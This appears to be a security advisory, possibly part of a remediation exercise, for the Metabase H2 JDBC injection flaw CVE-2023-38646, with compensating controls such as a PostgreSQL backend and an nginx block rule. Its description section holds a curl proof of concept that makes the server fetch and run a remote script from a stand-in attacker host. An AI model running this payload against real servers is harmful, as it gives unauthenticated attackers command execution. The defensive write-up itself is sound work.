# Metabase 0.46.6 — Pre-auth RCE via H2 JDBC Injection (CVE-2023-38646) — Compensating Controls

## Severity
**Critical** (CVSS 9.8)

## CVE / CWE
- CVE-2023-38646
- CWE-94: Improper Control of Generation of Code ('Code Injection')

## Description
Metabase versions before 0.46.6.1 / 1.46.6.1 expose the
`/api/setup/validate` endpoint without authentication. This endpoint
accepts a JSON body containing a database connection definition, including
`details.db` which is passed directly to the H2 JDBC driver as a
connection URL.

The H2 JDBC URL supports an `INIT=` parameter that executes arbitrary SQL
on connection, and H2's `RUNSCRIPT FROM` can fetch and execute a remote
script. By chaining these, an unauthenticated attacker achieves OS command
execution via H2's `CALL SHELLEXEC(...)`:

```bash
# PoC: pre-auth RCE via H2 JDBC injection
curl -s -X POST http://<host>:3000/api/setup/validate \
  -H 'Content-Type: application/json' \
  -d '{
    "token": "...",
    "details": {
      "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0;INIT=RUNSCRIPT FROM '"'"'http://attacker/exploit.sql'"'"'",
      "advanced-options": false,
      "ssl": false
    },
    "engine": "h2"
  }'
```

## Affected Service
- **Service:** Metabase 0.46.6
- **Port:** 3000/TCP
- **Vulnerable endpoint:** `POST /api/setup/validate`
- **Vulnerable condition:** H2 backend (`MB_DB_TYPE=h2`, the default)

## Remediation Steps (do NOT upgrade)
1. Switch the Metabase database backend from H2 to PostgreSQL by setting
   the environment variable `MB_DB_TYPE=postgres` (and corresponding
   `MB_DB_HOST`, `MB_DB_DBNAME`, `MB_DB_USER`, `MB_DB_PASS`).
   This removes the H2 JDBC code path exploited by the vulnerability.
2. Deploy nginx as a reverse proxy in front of Metabase (port 3001) and
   explicitly block the `/api/setup/validate` endpoint:
   ```nginx
   location = /api/setup/validate {
       return 403;
   }
   ```
3. Ensure port 3000 (nginx proxy) is the only externally reachable port;
   bind the Metabase JAR to localhost only (port 3001).
